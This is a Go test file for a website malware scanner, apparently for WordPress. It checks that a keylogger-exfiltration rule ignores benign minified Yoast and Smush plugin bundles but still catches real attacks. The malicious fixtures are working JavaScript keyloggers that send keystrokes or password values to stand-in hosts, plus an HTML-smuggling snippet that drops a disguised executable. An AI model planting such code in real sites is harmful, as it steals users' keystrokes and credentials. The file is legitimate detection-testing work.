package signatures

import "testing"

// Go-fallback parity for the 2026-07-24 exfil_keylogger_js false positives.
// The YAML rule had drifted far looser than its YARA-X counterpart: it needed
// only a key handler followed anywhere by a network call, which every minified
// plugin bundle satisfies. These reproduce the stock shapes that fired and keep
// real keystroke exfiltration detectable.

const yoastBundleShape = `).id&&"INPUT"===e.target.tagName&&e.preventDefault()}return addEventListener("keydown",e),` +
	`()=>removeEventListener("keydown",e)}),[]),(0,l.useCallback)((e=>fetch("https://my.yoast.com/api/Mailing-list/subscribe",` +
	`{method:"POST",mode:"cors",cache:"no-cache",credentials:"same-origin",headers:{"Content-Type":"application/json"},` +
	`redirect:"follow",referrerPolicy:"no-referrer",body:JSON.stringify({customerDetails:{firstName:"",email:e},` +
	`list:"Yoast newsletter",source:"free"})})).json()}(r)).error?(s("error"),i(ad)):(s("success"),i(od))}),[r]),` +
	`u=(0,l.useCallback)((e=>{s("waiting"),n(e.target.value)}),[])`

func TestKeyloggerYAML_StockPluginBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	if hasRule(scanner.ScanContent([]byte(yoastBundleShape), ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched stock Yoast bundle")
	}
}

func TestKeyloggerYAML_SearchAsYouTypeBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`e.addEventListener("keyup",function(){var q=document.getElementById("s")` +
		`,r=new XMLHttpRequest;r.open("POST","/wp-admin/admin-ajax.php"),r.send("action=search&term="+q.value)})`)
	if hasRule(scanner.ScanContent(legit, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched search-as-you-type widget posting its own input value")
	}
}

func TestKeyloggerYAML_RealKeystrokeExfilStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
		`fetch("https://evil.example.net/c",{method:"POST",body:b})});`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: buffered keystroke exfiltration not detected")
	}
}

func TestKeyloggerYAML_RealKeystrokeBeaconStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`window.onkeypress=function(e){navigator.sendBeacon("/wp-content/uploads/log.php","k="+e.key)};`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke beacon not detected")
	}
}

func TestKeyloggerYAML_CredentialFieldExfilStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`document.onkeyup=function(){var i=new Image;i.src="https://evil.example.net/p?c="+document.getElementById("password").value};`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: credential-field exfil not detected")
	}
}

// smushBundleShape is excerpted verbatim from WP Smush's minified
// smush-tutorials.min.js, the 2026-08-07 false positive: an Enter-key
// COMPARISON ((e.which||e.keyCode)===ct.KeyCode.RETURN) ~265 chars before an
// unrelated media fetch. Comparisons never store the keystroke.
const smushBundleShape = `-href"),"_blank")})),Ge(Je(t),"handleKeydown",(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),t.state={media:[],error:null,isLoaded:!1},t.openLink=t.openLink.bind(Je(t)),t.handleKeydown=t.handleKeydown.bind(Je(t)),t}return n=i,(r=[{key:"componentDidMount",value:function(){var e=this,t=this.props.media;fetch("https://wpmudev.com/blog/wp-json/wp/v2/media/"+t).then((function(e){return e.json()})).then((function(t){e.setState({isLoaded:!0,media:t.guid.rendered})}),(function(t){e.setState({isLoaded:!0,error:t})}))}},{key:"render",value:function(){var t=this.state,n=t.media,r=t.error,a=t.isLoaded` +
	`,translate:[{read_article:u,min_read:s}],onClick:function(e){return t.openLink(e)},onKeyDown:function(e){return t.handleKeydown(e)}}))}));return a?e.createElement(Ke,{type:"error"`

func TestKeyloggerYAML_SmushTutorialsBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	if hasRule(scanner.ScanContent([]byte(smushBundleShape), ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched Smush bundle (Enter-key comparison + unrelated media fetch)")
	}
}

func TestKeyloggerYAML_KeyCodeConstantNearFetch(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`window.onkeydown=function(e){return e};` +
		`var label="enter="+ct.KeyCode.RETURN;fetch("/wp-json/plugin/v1/settings")`)
	if hasRule(scanner.ScanContent(legit, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: treated a KeyCode constant as a captured keyCode property")
	}
}

func TestKeyloggerYAML_PushedKeystrokeBufferStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`var q=[];window.addEventListener("keyup",function(e){q.push(e.key);` +
		`if(q.length>=32){navigator.sendBeacon("/wp-content/uploads/.cache/l.php",q.join(""));q=[]}});`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: pushed keystroke buffer not detected")
	}
}

func TestKeyloggerYAML_TemplateLiteralKeystrokeStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte("addEventListener(\"keydown\",e=>{fetch(`https://t.example.invalid/k?v=${e.key}&u=${location.href}`,{mode:\"no-cors\"})});")
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: template-literal keystroke exfil not detected")
	}
}

func TestKeyloggerYAML_SinkBeforeCaptureStillDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`function ship(d){var x=new XMLHttpRequest;x.open("POST","//log.example.invalid/i");x.send(d)}` +
		`var log="";document.onkeydown=function(e){log+=String.fromCharCode(e.keyCode);if(log.length>64){ship(log);log=""}};`)
	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: sink-before-capture buffered keylogger not detected")
	}
}

// Go-fallback parity for the replacement HTML-smuggling rule. The suppressed
// Forge rule fired without any smuggled payload; this one must not.
func TestHTMLSmugglingYAML_BenignDownloadBundle(t *testing.T) {
	scanner := loadRepoScanner(t)
	legit := []byte(`function h(p){for(var v=0,i=0;i<p.length;i++)v=(v<<5)-v+p.charCodeAt(i)^0;return v}` +
		`function dl(d,n){var b=new Blob([new Uint8Array(atob(d).split("").map(function(c){return c.charCodeAt(0)}))]);` +
		`var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download=n;a.click()}`)
	if hasRule(scanner.ScanContent(legit, ".js"), "html_smuggling_payload") {
		t.Error("html_smuggling_payload FP: matched a bundle that smuggles nothing")
	}
}

func TestHTMLSmugglingYAML_EmbeddedExecutableDetected(t *testing.T) {
	scanner := loadRepoScanner(t)
	mal := []byte(`<script>var p="TVqQAAMAAAAEAAAA";var b=new Blob([new Uint8Array(atob(p).split("").map(c=>c.charCodeAt(0)))]);` +
		`var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="invoice.exe";a.click();</script>`)
	if !hasRule(scanner.ScanContent(mal, ".html"), "html_smuggling_payload") {
		t.Error("html_smuggling_payload regression: base64 PE payload not detected")
	}
}
